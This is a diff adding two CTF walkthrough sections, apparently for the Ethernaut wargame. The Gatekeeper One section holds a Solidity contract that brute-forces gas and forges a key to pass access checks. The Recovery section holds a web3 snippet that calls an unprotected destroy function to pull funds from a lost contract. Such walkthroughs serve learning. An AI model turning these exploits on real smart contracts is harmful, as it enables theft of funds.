@@ -309,6 +309,36 @@ Click unlock button with param is copied_address
 ===> submit level
 
 
+### Gatekeeper One
+`GatekeeperOneAttack.sol`
+```
+pragma solidity ^0.6.0;
+
+contract HackGatekeeperOne {
+    constructor() public {}
+    event Hacked(uint256 gasBrute);
+    function hack(address _gatekeeperAddr, uint256 _lowerGasBrute, uint256 _upperGasBrute) external {
+        bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);
+        bool success;
+        uint256 gasBrute;
+        for(gasBrute = _lowerGasBrute; gasBrute <= _upperGasBrute; gasBrute++){
+            (success, ) = _gatekeeperAddr.call.gas(gasBrute + (8191 * 3))(
+                abi.encodeWithSignature("enter(bytes8)", key)
+            );
+            if(success){
+                break;
+            }
+        }        
+        require(success, "HACK FAILED");
+        emit Hacked(gasBrute);
+    }
+}
+```
+Deploy this contract.
+After click hack button with param `<contract_address>, 1, 1000`
+
+==> submit level
+
 ### Gatekeeper Two
 `GatekeeperTwoAttack.sol`
 ```
@@ -385,6 +415,32 @@ await web3.eth.sendTransaction({
 })
 ```
 ===> submit level 
+
+### Recovery
+The fist you need find the lost address
+1. Goto transaction create instance of this level.
+2. That is the lost address you need
+![img](./img/recovery.jpg)
+
+console
+```
+functionSignature = {
+    name: 'destroy',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: '_to'
+        }
+    ]
+}
+
+params = [player]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+
+await web3.eth.sendTransaction({from: player, to: <the_lost_address>, data})
+```
 
 ### MagicNumber
 console
